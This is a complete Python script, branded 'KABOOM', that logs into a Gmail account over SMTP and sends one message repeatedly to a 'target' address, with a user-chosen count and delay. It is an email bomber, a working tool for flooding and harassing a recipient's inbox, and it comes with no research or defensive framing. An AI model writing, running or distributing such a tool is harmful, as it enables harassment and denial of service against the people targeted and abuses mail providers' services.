import smtplib
from email.message import EmailMessage
import time
import getpass
import sys

def banner():
    print("=" * 50)
    print("         ✉️  KABOOM ✉️")
    print("=" * 50)

def get_credentials():
    email = input("Your Gmail address (e.g., example@gmail.com): ")
    password = getpass.getpass("App password (hidden input): ")
    return email, password

def create_email(sender, recipient, subject, body):
    msg = EmailMessage()
    msg["From"] = sender
    msg["To"] = recipient
    msg["Subject"] = subject
    msg.set_content(body)
    return msg

def send_emails(server, sender, recipient, subject, body, count, delay):
    for i in range(1, count + 1):
        msg = create_email(sender, recipient, subject, body)
        try:
            server.send_message(msg)
            print(f"[{i}/{count}] Email sent to {recipient}")
            time.sleep(delay)
        except Exception as e:
            print(f"Error on send #{i}: {e}")
            break

def main():
    banner()
    sender_email, sender_password = get_credentials()
    
    recipient = input("Target email address: ")
    subject = input("Email subject: ")
    body = input("Email message content: ")
    count = int(input("Number of emails to send: "))
    delay = float(input("Delay between emails (in seconds): "))

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
            smtp.ehlo()
            smtp.starttls()
            smtp.login(sender_email, sender_password)
            print("✅ SMTP connection successful")
            send_emails(smtp, sender_email, recipient, subject, body, count, delay)
    except smtplib.SMTPAuthenticationError:
        print("❌ Authentication failed: check your app password.")
    except Exception as e:
        print(f"❌ SMTP error: {e}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Interrupted by user. Farewell, London.")
        sys.exit()
